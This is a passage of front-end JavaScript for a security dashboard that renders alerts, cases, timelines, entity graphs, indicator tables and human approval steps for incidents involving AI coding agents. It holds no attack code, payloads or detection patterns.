"use strict";
// No framework, no inline handlers (strict CSP). All dynamic text goes through esc().
const SEV = ["critical", "high", "medium", "low"];
const STATUS = {new: "New", triaged: "Triaged", investigating: "Investigating", contained: "Contained",
  closed_tp: "Closed – true positive", closed_fp: "Closed – false positive"};
const CLOSED = new Set(["closed_tp", "closed_fp"]);
const S = {tab: "overview", sev: null, prio: null, signals: false, val: null, cat: "", st: "", q: "", group: true, sel: null, detail: null,
  rules: null, stats: null, alerts: [], cases: [], sources: null, pipe: null, resp: null, logTab: "quarantine_log", built: false, cov: null, intel: null, hunt: null, plat: null, ai: null, intelKind: "all", me: null};
const CORR = r => (r === "C1" || r === "C2") ? 1 : 0;
const $ = id => document.getElementById(id);
const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"}[c]));
const ident = () => { let n = "", r = "analyst"; try { n = localStorage.getItem("actor") || ""; r = localStorage.getItem("role") || "analyst"; } catch (e) {} return {n, r}; };
const api = async (u, o = {}) => {
  const {n, r} = ident();
  o.headers = {...(o.headers || {}), "X-Actor": n || "anonymous", "X-Role": r};
  const res = await fetch(u, o);
  if (!res.ok) { let d = res.status; try { d = (await res.json()).detail || d; } catch (e) {} throw new Error(d); }
  return res.json();
};
const hms = t => (t || "").slice(11, 19);
const pill = (cls, txt) => `<span class="pill ${esc(cls)}">${esc(txt)}</span>`;
const sevPill = s => pill(s, s.toUpperCase());
const PRIO = {P1: "Drop everything", P2: "Same hour", P3: "Same day", P4: "Backlog"};
const prioPill = p => `<span class="pill prio ${esc(p.level)}" title="${esc(PRIO[p.level])} · score ${esc(p.score)} · confidence ${esc(p.confidence)}">${esc(p.level)}</span>`;
const stPill = s => `<span class="pill st">${esc(STATUS[s] || s)}</span>`;

async function load() {
  try {
    S.stats = await api("/api/stats");
    const jobs = [];
    if (S.tab === "overview" || S.tab === "alerts") jobs.push(api("/api/alerts?tier=" + (S.signals && S.tab === "alerts" ? "all" : "case")).then(x => S.alerts = x), api("/api/cases").then(x => S.cases = x));
    if (S.tab === "overview" || S.tab === "sources") jobs.push(api("/api/sources").then(x => S.sources = x));
    if (S.tab === "logic") jobs.push(api("/api/rules").then(x => S.rules = x));
    if (S.tab === "logic" && !S.val) jobs.push(api("/api/validation").then(x => S.val = x));
    if (!S.priv) jobs.push(api("/api/privacy-notice").then(x => S.priv = x));
    if (!S.rb) jobs.push(api("/api/runbooks").then(x => S.rb = x));
    if (S.tab === "runbooks" && S.rbsel) jobs.push(api("/api/runbooks/" + encodeURIComponent(S.rbsel)).then(x => S.rbdoc = x));
    if (S.tab === "pipeline" || S.tab === "gov") jobs.push(api("/api/environment").then(x => S.env = x));
    if (S.tab === "pipeline" && !S.cov) jobs.push(api("/api/coverage").then(x => S.cov = x));
    if (S.tab === "intel") jobs.push(api("/api/intel").then(x => S.intel = x));
    if (S.tab === "platform") jobs.push(api("/api/platform").then(x => S.plat = x), api("/api/platform/retention").then(x => S.retset = x));
    if (S.tab === "alerts") jobs.push(api("/api/ai/status").then(x => S.ai = x));
    if (S.tab === "gov") jobs.push(api("/api/audit?limit=150&q=" + encodeURIComponent(S.audq || "")).then(x => S.aud = x));
    if (S.tab === "pipeline" || !S.pipe) jobs.push(api("/api/pipeline").then(x => S.pipe = x), api("/api/responses").then(x => S.resp = x));
    await Promise.all(jobs);
    render();
  } catch (e) { $("progress").textContent = "API unreachable (" + e.message + ")"; }
}

function render() {
  const s = S.stats; if (!s) return;
  const run = s.replay.running;
  $("pulse").className = "pulse" + (run ? " run" : "");
  $("progress").textContent = run ? `replaying ${s.replay.progress}/${s.replay.total} events` : `${s.events_processed} events processed`;
  document.querySelectorAll("#tabs button").forEach(b => b.classList.toggle("on", b.dataset.tab === S.tab));
  document.querySelectorAll(".tab").forEach(t => t.classList.toggle("on", t.id === "tab-" + S.tab));
  ({overview: renderOverview, alerts: renderAlerts, sources: renderSources, logic: renderLogic, pipeline: renderPipeline, gov: renderGov, runbooks: renderRunbooks, intel: renderIntel, platform: renderPlatform})[S.tab]();
  document.querySelectorAll("[data-w]").forEach(e => { e.style.width = e.dataset.w + "%"; });   // CSSOM is CSP-safe; style="" attributes are not
}

/* ------------------------------------------------------------------ overview */
function renderOverview() {
  const s = S.stats, p = s.posture;
  $("posture").className = "posture " + p.level;
  $("posture").innerHTML = `<span class="lvl">${esc(p.level.toUpperCase())}</span><div><b>${esc(p.label)}</b><div class="meta">${esc(p.detail)}</div></div>`;
  const k = (n, l, c) => `<div class="kpi"><b class="${c || ""}">${esc(n)}</b><span>${esc(l)}</span></div>`;
  $("kpis").innerHTML = k(s.priority.P1, "P1 · drop everything", s.priority.P1 ? "c-crit" : "") + k(s.priority.P2, "P2 · same hour", s.priority.P2 ? "c-high" : "") +
    k(s.priority.P3 + s.priority.P4, "P3–P4 · same day / backlog") + k(s.signals_total, "low signals stored (no page)") +
    k(`${s.telemetry.reporting}/${s.telemetry.total}`, "endpoints reporting", s.telemetry.silent ? "c-crit" : "c-ok") + k(s.events_processed, "events ingested");
  const act = S.cases.filter(c => !CLOSED.has(c.status)).slice(0, 6);
  $("attention").innerHTML = act.length ? act.map(c => `<div class="att">${prioPill(c.priority)}
      <div><b>${esc(c.title)}</b><div class="meta">${esc(c.priority.reasons.slice(1, 4).join(" · "))}</div><div class="meta">${esc(c.case_id)} · ${esc(c.user)} · ${esc(c.host)}${c.repo ? " · " + esc(c.repo) : ""} · ${c.alert_ids.length} alert(s) · ${stPill(c.status)}</div>
      <div class="meta">⚙ ${c.auto_actions} automatic action(s) · ${c.pending_decisions ? `<b class="c-high">${c.pending_decisions} decision(s) awaiting a human</b>` : "no decisions pending"}</div>
      <div class="meta">${esc(c.sla)}</div></div><button data-a="opencase" data-case="${esc(c.case_id)}">Open</button></div>`).join("")
    : `<div class="empty">No active cases.</div>`;
  const max = Math.max(1, ...Object.values(s.by_category));
  $("cats").innerHTML = Object.entries(s.by_category).map(([c, n]) =>
    `<div class="row link" data-a="catfilter" data-cat="${esc(c)}"><span>${esc(c)}</span><div class="bar"><i data-w="${n / max * 100}"></i></div><span class="num">${n}</span></div>`).join("");
  const t = s.telemetry, src = S.sources;
  const bad = (src?.hosts || []).filter(h => h.status.startsWith("silent"));
  const gaps = (src?.hosts || []).flatMap(h => h.gaps.map(g => `${h.host}: ${g.minutes} min (${hms(g.from)}→${hms(g.to)}Z)`));
  $("telem").innerHTML = `<div class="stat3"><div><b class="c-ok">${t.reporting}</b><span class="meta">reporting</span></div>
    <div><b class="c-med">${t.delayed}</b><span class="meta">delayed</span></div><div><b class="c-crit">${t.silent}</b><span class="meta">silent</span></div></div>
    ${bad.map(h => `<p class="meta">⚠ ${esc(h.host)} — ${esc(h.status)}, last seen ${esc(hms(h.last_reported))}Z</p>`).join("")}
    ${gaps.length ? `<p class="meta">Past gaps: ${esc([...new Set(gaps)].slice(0, 3).join(" · "))}${gaps.length > 3 ? " …" : ""}</p>` : ""}`;
  const r = s.responses, c = (n, l) => `<div><b>${n}</b><span class="meta">${l}</span></div>`;
  $("contain").innerHTML = `<div class="stat3">${c(r.sessions_frozen, "sessions frozen")}${c(r.host_isolations, "host isolations")}${c(r.packages_blocked, "packages blocked")}
    ${c(r.webhooks, "webhooks sent")}${c(r.quarantine_entries, "quarantine entries")}${c(r.files_flagged, "files flagged")}</div>`;
}

/* ------------------------------------------------------------------ alerts & cases */
function buildAlertControls() {
  if (S.built) return; S.built = true;
  $("stsel").innerHTML = `<option value="">All statuses</option><option value="active">Active (not closed)</option>` +
    Object.entries(STATUS).map(([k, v]) => `<option value="${k}">${esc(v)}</option>`).join("");
  $("catsel").innerHTML = `<option value="">All categories</option>` + Object.keys(S.stats.by_category).map(c => `<option>${esc(c)}</option>`).join("");
  $("sevchips").addEventListener("click", e => {
    const c = e.target.closest("[data-sev]"), p = e.target.closest("[data-prio]");
    if (c) { S.sev = S.sev === c.dataset.sev ? null : c.dataset.sev; renderAlerts(); }
    if (p) { S.prio = S.prio === p.dataset.prio ? null : p.dataset.prio; renderAlerts(); }
  });
  $("signals").addEventListener("change", e => { S.signals = e.target.checked; load(); });
  $("stsel").addEventListener("change", e => { S.st = e.target.value; renderAlerts(); });
  $("catsel").addEventListener("change", e => { S.cat = e.target.value; renderAlerts(); });
  $("q").addEventListener("input", e => { S.q = e.target.value; renderAlerts(); });
  $("group").addEventListener("change", e => { S.group = e.target.checked; renderAlerts(); });
}
const stOk = (status) => !S.st || (S.st === "active" ? !CLOSED.has(status) : status === S.st);
const casesAlerts = cid => S.alerts.filter(a => a.case_id === cid);

function renderAlerts() {
  buildAlertControls();
  $("catsel").value = S.cat; $("stsel").value = S.st; $("group").checked = S.group; $("signals").checked = S.signals;
  const pc = S.stats.priority;
  $("sevchips").innerHTML = (S.group ? ["P1", "P2", "P3", "P4"].map(v => `<span class="chip prio ${v} ${S.prio === v ? "on" : ""}" data-prio="${v}">${v} ${pc[v]}</span>`)
    : SEV.map(v => `<span class="chip ${S.sev === v ? "on" : ""}" data-sev="${v}">${v} ${S.stats.by_severity[v]}</span>`)).join("");
  const q = S.q.toLowerCase();
  let html;
  if (S.group) {
    const rows = S.cases.filter(c => (!S.prio || c.priority.level === S.prio) && stOk(c.status) &&
      (!S.cat || casesAlerts(c.case_id).some(a => a.category === S.cat)) && (!q || JSON.stringify(c).toLowerCase().includes(q)));
    html = rows.map(c => {
      const best = casesAlerts(c.case_id).sort((a, b) => SEV.indexOf(a.severity) - SEV.indexOf(b.severity) || CORR(b.rule_id) - CORR(a.rule_id))[0];
      return `<div class="alert ${c.severity} ${best && S.sel === best.alert_id ? "sel" : ""} ${CLOSED.has(c.status) ? "closed" : ""}" data-a="selalert" data-id="${esc(best?.alert_id)}">
        <div class="t">${prioPill(c.priority)}${sevPill(c.severity)}<b>${esc(c.title)}</b></div>
        <div class="meta">${esc(c.priority.reasons.slice(1, 4).join(" · "))}</div>
        <div class="meta">${esc(c.case_id)} · ${c.alert_ids.length} alert(s) [${esc(c.rules.join(", "))}]${c.signals ? ` + ${c.signals} signal(s)` : ""} · ${esc(c.user)} · ${esc(c.host)} · ${stPill(c.status)}</div>
        <div class="meta">⚙ ${c.auto_actions} automatic action(s) · ${c.pending_decisions ? `<b class="c-high">${c.pending_decisions} decision(s) awaiting a human</b>` : "no decisions pending"}</div></div>`;
    }).join("");
  } else {
    const rows = S.alerts.filter(a => (!S.sev || a.severity === S.sev) && (!S.cat || a.category === S.cat) && stOk(a.status) &&
      (!q || JSON.stringify(a).toLowerCase().includes(q)));
    html = rows.map(a => `<div class="alert ${a.severity} ${a.tier === "signal" ? "signal" : ""} ${S.sel === a.alert_id ? "sel" : ""} ${CLOSED.has(a.status) ? "closed" : ""}" data-a="selalert" data-id="${esc(a.alert_id)}">
      <div class="t"><span class="time">${esc(hms(a.ts))}</span>${sevPill(a.severity)}${a.tier === "signal" ? pill("st", "signal") : ""}<b>${esc(a.title)}</b></div>
      <div class="meta">${esc(a.category)} · ${esc(a.user)} · ${esc(a.host)} · ${esc(a.alert_id)} · ${esc(a.case_id || "no case")} · ${stPill(a.status)}</div></div>`).join("");
  }
  $("feed").innerHTML = html || `<div class="empty">Nothing matches the current filters.</div>`;
}

async function selectAlert(id) {
  S.sel = id;
  const a = S.alerts.find(x => x.alert_id === id); if (!a) return;
  S.detail = a.case_id ? await api("/api/cases/" + encodeURIComponent(a.case_id)) : {signal_only: true};
  renderAlerts(); renderDetail(); $("detail").scrollTop = 0;
}

function list(items) { return `<ul>${(items || []).map(i => `<li>${esc(i)}</li>`).join("")}</ul>`; }


/* ------------------------------------------------------------------ case visuals */
const NS = "http://www.w3.org/2000/svg";
const cut = (s, n) => { s = String(s ?? ""); return s.length > n ? s.slice(0, n - 1) + "…" : s; };
const LANES = ["Prompt", "Agent", "Content in", "Shell", "Files · git · packages", "Network · LLM", "Identity · cloud · SCM", "Detections", "Automation"];

function swimlane(br) {
  const items = br.story.filter(x => LANES.includes(x.lane)), n = items.length;
  if (!n) return `<div class="meta">No session events to draw (the absence of events is the signal).</div>`;
  const lanes = LANES.filter(l => items.some(x => x.lane === l)), LH = 34, L = 132, W = 690, top = 16;
  const step = Math.min(64, (W - L - 14) / n), H = top + lanes.length * LH + 10, pos = {};
  const X = i => L + i * step + step / 2, Y = l => top + lanes.indexOf(l) * LH + LH / 2;
  let g = lanes.map((l, i) => `<rect class="lane ${i % 2 ? "alt" : ""}" x="0" y="${top + i * LH}" width="${W}" height="${LH}"/><text class="ln" x="6" y="${top + i * LH + LH / 2 + 4}">${esc(l)}</text>`).join("");
  items.forEach((x, i) => { if (x.eid) pos[x.eid] = {x: X(i), y: Y(x.lane)}; });
  let marks = "", paths = "";
  items.forEach((x, i) => {
    const cx = X(i), cy = Y(x.lane), tip = `<title>${esc(hms(x.ts))} · ${esc(x.text)}</title>`;
    if (i === 0 || i === n - 1 || x.flagged || x.kind === "detection") marks += `<text class="tk" x="${cx}" y="10" text-anchor="middle">${esc(hms(x.ts))}</text>`;
    if (x.kind === "event") marks += `<circle class="ev ${x.flagged ? "fl" : ""}" cx="${cx}" cy="${cy}" r="7">${tip}</circle>`;
    else if (x.kind === "detection") {
      marks += `<polygon class="dt ${esc(x.severity)}" points="${cx},${cy - 8} ${cx + 8},${cy + 7} ${cx - 8},${cy + 7}">${tip}</polygon>`;
      const p = (x.eids || []).map(e => pos[e]).find(Boolean);
      if (p) paths += `<line class="dl" x1="${cx}" y1="${cy - 8}" x2="${p.x}" y2="${p.y + 7}"/>`;
    } else marks += `<rect class="au" x="${cx - 6}" y="${cy - 6}" width="12" height="12" rx="2">${tip}</rect>`;
  });
  (br.links || []).forEach(l => {
    const a = pos[l.from], b = pos[l.to]; if (!a || !b) return;
    const mx = (a.x + b.x) / 2, my = Math.min(a.y, b.y) - 14;
    paths += l.kind === "provenance" ? `<path class="lk prov" d="M${a.x},${a.y} Q${mx},${my} ${b.x},${b.y}" marker-end="url(#arP)"/>`
      : `<line class="lk fol" x1="${a.x + 7}" y1="${a.y}" x2="${b.x - 8}" y2="${b.y}" marker-end="url(#arF)"/>`;
  });
  return `<svg class="viz" viewBox="0 0 ${W} ${H}" role="img" aria-label="Swim-lane timeline of the case"><defs>
    <marker id="arP" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="mkp" d="M0,0 L8,4 L0,8z"/></marker>
    <marker id="arF" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="mkf" d="M0,0 L8,4 L0,8z"/></marker></defs>${g}${paths}${marks}</svg>
    <div class="legend"><span><i class="ev"></i>event</span><span><i class="ev fl"></i>flagged event</span><span><i class="tri"></i>detection</span><span><i class="au"></i>automation</span>
    <span><i class="lkp"></i>content → command (provenance)</span></div>`;
}

function entityGraph(gr) {
  if (!gr.nodes.length) return `<div class="meta">No entities to show.</div>`;
  const col = {user: 0, host: 0, repo: 0, content: 0, agent: 1, command: 2, file: 2, package: 2, dest: 3};
  const cols = [[], [], [], []]; gr.nodes.forEach(n => cols[col[n.kind] ?? 2].push(n));
  const NW = 140, NH = 40, GAP = 14, XS = [4, 196, 372, 556], rows = Math.max(...cols.map(c => c.length));
  const H = 12 + rows * (NH + GAP) + (gr.edges.some(e => e.kind === "link") ? 56 : 0), P = {};
  cols.forEach((c, ci) => { const off = (rows - c.length) * (NH + GAP) / 2; c.forEach((n, i) => { P[n.id] = {x: XS[ci], y: 8 + off + i * (NH + GAP)}; }); });
  const ed = gr.edges.map(e => {
    const a = P[e.from], b = P[e.to]; if (!a || !b) return "";
    const same = a.x === b.x, x1 = same ? a.x + NW / 2 : (a.x < b.x ? a.x + NW : a.x), y1 = same ? (a.y < b.y ? a.y + NH : a.y) : a.y + NH / 2;
    const x2 = same ? b.x + NW / 2 : (a.x < b.x ? b.x : b.x + NW), y2 = same ? (a.y < b.y ? b.y : b.y + NH) : b.y + NH / 2;
    const mk = `marker-end="url(#ag${e.kind === "flow" ? "F" : "R"})"`, lab = (e.kind === "link" || e.kind === "attacker");
    if (e.kind === "link") {   // causal link curves below the agent column so it never hides behind a node
      const yb = Math.max(y1, y2) + 50, my = 0.125 * (y1 + y2) + 0.75 * yb;
      return `<path class="ge link" d="M${x1},${y1} C${x1 + 70},${yb} ${x2 - 70},${yb} ${x2},${y2}" ${mk}/><text class="gl" x="${(x1 + x2) / 2}" y="${my + 3}" text-anchor="middle">${esc(e.label)}</text>`;
    }
    return `<line class="ge ${esc(e.kind)}" x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" ${mk}/>` +
      (lab ? `<text class="gl" x="${(x1 + x2) / 2}" y="${(y1 + y2) / 2 - 4}" text-anchor="middle">${esc(cut(e.label, 26))}</text>` : "");
  }).join("");
  const nd = gr.nodes.map(n => { const p = P[n.id];
    return `<g><rect class="gn k-${esc(n.kind)} ${n.ioc ? "ioc" : ""} ${n.flagged ? "fl" : ""}" x="${p.x}" y="${p.y}" width="${NW}" height="${NH}" rx="6"/>
      <text class="gt" x="${p.x + 8}" y="${p.y + 17}">${esc(cut(n.label, 22))}</text><text class="gs" x="${p.x + 8}" y="${p.y + 32}">${esc(cut(n.sub, 27))}</text>
      <title>${esc(n.kind)}: ${esc(n.label)} ${esc(n.sub)}</title></g>`; }).join("");
  return `<svg class="viz" viewBox="0 0 700 ${H}" role="img" aria-label="Entity graph: who, what came in, what the agent did, where it went"><defs>
    <marker id="agF" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="mkf" d="M0,0 L8,4 L0,8z"/></marker>
    <marker id="agR" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="mkp" d="M0,0 L8,4 L0,8z"/></marker></defs>${ed}${nd}</svg>
    <div class="legend"><span><i class="gb"></i>entity</span><span><i class="gb fl"></i>flagged</span><span><i class="gb ioc"></i>IOC</span><span><i class="lkp"></i>causal link</span></div>`;
}

function iocTable(gr) {
  if (!gr.iocs.length) return `<div class="meta">No indicators extracted.</div>`;
  return `<table class="tbl"><tr><th>Type</th><th>Indicator</th><th>Role</th><th>Intel list</th><th>First seen</th><th>Also in</th></tr>${gr.iocs.map(i =>
    `<tr><td>${esc(i.type)}</td><td class="mono">${esc(cut(i.value, 46))}</td><td>${esc(i.role)}</td><td>${(i.intel || []).map(t => pill(t.startsWith("threat") ? "silent" : "st", t)).join(" ") || "–"}</td><td>${esc(hms(i.first_seen))}Z</td>
     <td>${i.also_in.length ? i.also_in.map(c => `<a href="#" data-a="opencase" data-case="${esc(c)}">${esc(c)}</a>`).join(" ") : "–"}</td></tr>`).join("")}</table>`;
}

const HSTAT = {supported: "supported", possible: "possible", open: "open question", unlikely: "unlikely", not_observed: "not observed"};
function whyPanel(o) {
  if (!o) return `<div class="meta">Host-level case: there is no agent action to explain.</div>`;
  const hy = o.hypotheses.map(h => `<div class="hyp ${esc(h.status)}"><div><span class="hs">${esc(HSTAT[h.status] || h.status)}</span> <b>${esc(h.id)} · ${esc(h.name)}</b></div>
    ${h.for.map(x => `<div class="meta">＋ ${esc(x)}</div>`).join("")}${h.against.map(x => `<div class="meta">－ ${esc(x)}</div>`).join("")}
    <details><summary class="meta">What to check next</summary>${list(h.check)}</details></div>`).join("");
  return `<div class="verdict ${esc(o.confidence)}"><b>${esc(o.verdict)}</b><div class="meta">Confidence: ${esc(o.confidence)} · action examined: ${esc(hms(o.action.ts))}Z ${esc(o.action.type)}: ${esc(o.action.text)}</div></div>
    ${list(o.findings)}<h5>Hypotheses tested</h5>${hy}<details><summary class="meta">What this telemetry cannot see</summary>${list(o.blind_spots)}</details>`;
}

const expPill = x => { const e = x.expiry; if (!e || e.state === "none") return "–"; return pill(e.state === "expired" ? "silent" : e.state === "due_soon" ? "delayed" : "ok", e.state === "expired" ? `overdue ${-e.days_left} d` : `${e.review_by} · ${e.days_left} d`); };
const kindPill = k => k === "context" ? pill("st", "context") : pill("ok", "policy");
const rbFor = rid => (S.rb || []).find(r => r.rules.includes(rid));
const rbBtn = (rid, label) => { const r = rbFor(rid); return r ? `<button data-a="openrb" data-id="${esc(r.id)}" title="${esc(r.title)}">${esc(label || "Runbook")} ${esc(r.id)}</button>` : ""; };
// "used_by" is rule IDs (link to the rule's runbook) or a plain sentence
const usedBy = x => esc([].concat(x.used_by || []).join(", "));
function renderDetail() {
  const a = S.alerts.find(x => x.alert_id === S.sel), c = S.detail, el = $("detail");
  if (!a || !c) { el.innerHTML = `<div class="empty">Select a case or alert to see the briefing, what automation did and what needs a human decision.</div>`; return; }
  if (c.signal_only) { el.innerHTML = `<h3>${esc(a.title)}</h3><div>${sevPill(a.severity)} ${pill("st", "signal · no case")}</div>
    <p class="brief">Stored for hunting and trend analysis. It did not open a case and nobody was paged. It joins a case automatically if a stronger alert follows in the same session.</p>
    <div class="meta">${esc(a.ts)} · ${esc(a.user)} · ${esc(a.host)} · session ${esc(a.session_id)}</div>${a.evidence.signals.map(s => `<span class="chip">${esc(s)}</span>`).join("")}<pre>${esc(a.evidence.snippet)}</pre>
    <div class="mt"><b>Recommended.</b> ${esc(a.recommended_action)}</div><div class="mt">${rbBtn(a.rule_id)}</div>`; return; }
  const sm = c.summary;
  const sum = `<div class="summ ${esc(sm.verdict.tone)}"><div class="vl"><b>${esc(sm.verdict.label)}</b><span class="meta">confidence: ${esc(sm.verdict.confidence)}</span></div>
    <ol class="happened">${sm.what_happened.map(x => `<li>${esc(x)}</li>`).join("")}</ol>
    <div class="kv"><b>Why it matters</b><span>${esc(sm.why_it_matters)}</span></div>
    <div class="kv do"><b>Do now</b><span>${esc(sm.do_now)}</span></div>
    <div class="kv"><b>Ask</b><span>${esc(sm.ask)}</span></div>
    ${sm.not_sure.length ? `<div class="kv"><b>Not sure about</b><span>${sm.not_sure.map(esc).join(" ")}</span></div>` : ""}
    <details><summary class="meta">Why ${esc(c.priority.level)} (score ${esc(c.priority.score)})</summary>${list(c.priority.reasons)}</details></div>`;
  const br = c.briefing, cat = (S.pipe?.rules || []).find(r => r.id === a.rule_id) || {};
  const tags = [...a.mitre.attack.map(t => ({...t, k: "attack"})), ...a.mitre.atlas.map(t => ({...t, k: "atlas"}))]
    .map(t => `<a class="tag ${t.k}" href="${esc(t.url)}" target="_blank" rel="noopener noreferrer" title="${esc(t.tactic)}">${t.k === "atlas" ? "ATLAS" : "ATT&amp;CK"} ${esc(t.id)} · ${esc(t.name.split(": ").pop())}</a>`).join("");
  const seen = new Set(), stageNames = (c.origin?.link ? [["Untrusted content", "high"]] : []).concat(br.stages.filter(x => !CORR(x.rule_id)).map(x => [x.stage.split(":")[0], x.severity]))
    .filter(([n]) => !seen.has(n) && seen.add(n));
  const steps = stageNames.map(([n, sv]) => `<span class="step ${esc(sv)}">${esc(n)}</span>`).join('<span class="arrow">→</span>');
  const auto = br.automated.map(x => `<div class="act">✔ ${esc(x.label)}${x.alert_ids.length > 1 ? ` <span class="meta">×${x.alert_ids.length}</span>` : ""} <span class="meta">— ${esc(x.detail)} · ${esc(x.status)}</span></div>`).join("")
    || `<span class="meta">No automatic action (below response threshold).</span>`;
  let nextShown = false;
  const dec = c.decisions.map(d => {
    const next = d.status === "pending" && !nextShown && (nextShown = true);
    const state = d.status === "pending"
      ? `<div class="r"><button class="primary" data-a="decide" data-case="${esc(c.case_id)}" data-key="${esc(d.key)}" data-v="approved">Approve</button>
         <button data-a="decide" data-case="${esc(c.case_id)}" data-key="${esc(d.key)}" data-v="declined">Decline</button></div>`
      : `<div class="meta">${d.status === "approved" ? "✔ Approved (executed, simulated)" : "✖ Declined"} by ${esc(d.by)} at ${esc(hms(d.at))}Z</div>`;
    const sug = (c.ai_suggested || []).includes(d.key) && d.status === "pending";
    return `<div class="dec ${esc(d.status)} ${next ? "next" : ""}"><div><b>${next ? "NEXT · " : ""}${esc(d.action)}</b> ${sug ? pill("st", "AI suggested · a person decides") : ""}</div>
      <div class="meta">Owner: ${esc(d.owner)} · decide ${esc(d.due)}</div><div class="meta">Why a human: ${esc(d.why)}</div>${state}</div>`;
  }).join("") || `<span class="meta">No human decision required.</span>`;
  const story = br.story.map(x => `<div class="tl ${x.kind} ${x.flagged ? "flag" : ""}"><span>${esc(hms(x.ts))}</span><span>${x.kind === "detection" ? "⚠ detection" : x.kind === "action" ? "⚙ automation" : (x.flagged ? "⚑ " : "") + "event"}</span><span>${esc(x.text)}</span></div>`).join("")
    || `<div class="meta">No session events (host-level or platform-level alert: the absence of events is the signal).</div>`;
  const related = c.alerts.map(x => `<div class="meta"><a href="#" data-a="selalert" data-id="${esc(x.alert_id)}">${esc(x.alert_id)}</a> ${sevPill(x.severity)} [${esc(x.rule_id)}] ${esc(x.title)}</div>`).join("");
  const hist = c.history.slice().reverse().map(h => `<div>${esc(h.ts.slice(11, 19))}Z · ${esc(h.who)} · ${esc(h.event)}</div>`).join("");
  const notes = c.notes.map(n => `<div class="meta">📝 ${esc(n.who)} (${esc(n.ts.slice(11, 19))}Z): ${esc(n.text)}</div>`).join("");
  el.innerHTML = `<h3>${esc(c.title)}</h3>
    <div>${prioPill(c.priority)} ${sevPill(c.severity)} ${stPill(c.status)} ${pill("st", c.case_id)}</div>
    <div class="meta mt">user <b>${esc(c.user)}</b> · host ${esc(c.host)} · repo ${esc(c.repo || "–")} · agent ${esc(c.agent || "–")} · target: ${esc(c.sla)}</div>
    ${sum}
    <div class="mt">${rbBtn(a.rule_id, "Open runbook")} ${(S.rb || []).filter(r => r.id === "RB-00").map(r => `<button data-a="openrb" data-id="RB-00">Triage guide RB-00</button>`).join("")}</div>
    <h4>Technical briefing</h4>${br.summary.map(t => `<p class="brief">${esc(t)}</p>`).join("")}<div class="chain">${steps}</div>
    <h4>Why did this happen?</h4>${whyPanel(c.origin)}
    <h4>Automation already did (${br.autonomy.automated})</h4>${auto}
    <h4>Needs a human decision (${br.autonomy.pending} pending · ${br.autonomy.decided} decided)</h4>${dec}
    <h4>Attack story: timeline, links between events</h4>${swimlane(br)}
    <h4>Connected entities and assets</h4>${entityGraph(c.graph)}
    <h4>Indicators of compromise (${c.graph.iocs.length})</h4>${iocTable(c.graph)}
    <h4>Context from the intel list</h4>${intelBlock(c)}
    <h4>AI second opinion (optional)</h4>${aiBlock(c)}
    <details class="mt"><summary class="meta">Event-by-event text timeline</summary><div>${story}</div></details>
    <h4>Selected alert · ${esc(a.alert_id)} [${esc(a.rule_id)}] ${esc(a.title)}</h4>
    <div class="meta">${esc(a.ts)} · session ${esc(a.session_id)}</div>
    ${a.evidence.signals.length ? a.evidence.signals.map(s => `<span class="chip">${esc(s)}</span>`).join("") : ""}<pre>${esc(a.evidence.snippet)}</pre>
    <div><b>What it means.</b> ${esc(cat.why || "")}</div><div class="mt"><b>Recommended now.</b> ${esc(a.recommended_action)}</div>
    <h4>Triage questions</h4>${list(cat.triage)}
    <h4>Containment &amp; follow-up</h4>${list(cat.contain)}
    <h4>MITRE mapping</h4>${tags}
    <h4>Alerts in this case (${c.alerts.length})</h4>${related}
    <h4>Case workflow · ${esc(c.case_id)}</h4>
    ${privBanner(false)}
    <div class="wf" id="wf-box"><div class="r"><select id="wf-status">${Object.entries(STATUS).map(([k, v]) => `<option value="${k}" ${k === c.status ? "selected" : ""}>${esc(v)}</option>`).join("")}</select>
      <input id="wf-owner" type="text" maxlength="64" placeholder="Owner (analyst)" value="${esc(c.owner || "")}"></div>
      <textarea id="wf-note" maxlength="1000" placeholder="Add an investigation note…"></textarea>
      <div><button class="primary" data-a="savecase" data-case="${esc(c.case_id)}">Save case</button><span id="wf-msg" class="meta" role="alert"></span>
        <button data-a="proposefrom" data-case="${esc(c.case_id)}" title="Closing as false positive? Propose the missing fact for the register (needs a senior to approve)">Propose register entry from this case</button></div></div>
    ${notes}<div class="hist">${hist}</div>`;
}

function privBanner(compact) {
  const p = S.priv; if (!p) return "";
  const guard = p.guard === "off" ? "" : ` ${esc(p.enforcement)}`;
  return `<div class="privacy" role="note" aria-label="Privacy notice"><b>${esc(p.title)}</b>` +
    (compact ? `<div>${esc(p.instead)}${guard}</div>` :
      `<ul>${p.do_not_enter.map(x => `<li>${esc(x)}</li>`).join("")}</ul><div><b>Instead:</b> ${esc(p.instead)}</div><div class="meta">${esc(p.why)} ${esc(p.basis)}${guard}</div>`) + `</div>`;
}

async function decide(cid, key, v) {
  S.detail = await api(`/api/cases/${encodeURIComponent(cid)}/decisions`, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({key, decision: v})});
  await load(); renderDetail();
}

async function saveCase(cid) {
  const body = {status: $("wf-status").value, owner: $("wf-owner").value.trim(), note: $("wf-note").value.trim() || null};
  try { S.detail = await api("/api/cases/" + encodeURIComponent(cid), {method: "PATCH", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)}); }
  catch (e) { $("wf-msg").innerHTML = `<span class="err">${esc(e.message)}</span>`; return; }      // refused (privacy guard): keep what was typed so it can be corrected
  await load(); renderDetail();
}

/* ------------------------------------------------------------------ sources */
function renderSources() {
  const x = S.sources; if (!x) return;
  const cls = st => st.startsWith("silent") ? "silent" : st.startsWith("idle") ? "idle" : st;
  $("srcsum").innerHTML = `${pill("reporting", x.summary.reporting + " reporting")} ${pill("delayed", x.summary.delayed + " delayed")} ${pill("silent", x.summary.silent + " silent")}`;
  $("hosts").innerHTML = `<table><thead><tr><th>Source (host)</th><th>User</th><th>Agent</th><th>Status</th><th>Last reported (UTC)</th><th>Age</th><th>Events</th><th>Past gaps</th></tr></thead><tbody>` +
    x.hosts.map(h => `<tr><td class="mono">${esc(h.host)}</td><td>${esc(h.user)}</td><td>${esc(h.agent || "–")}</td><td>${pill(cls(h.status), h.status)}</td>
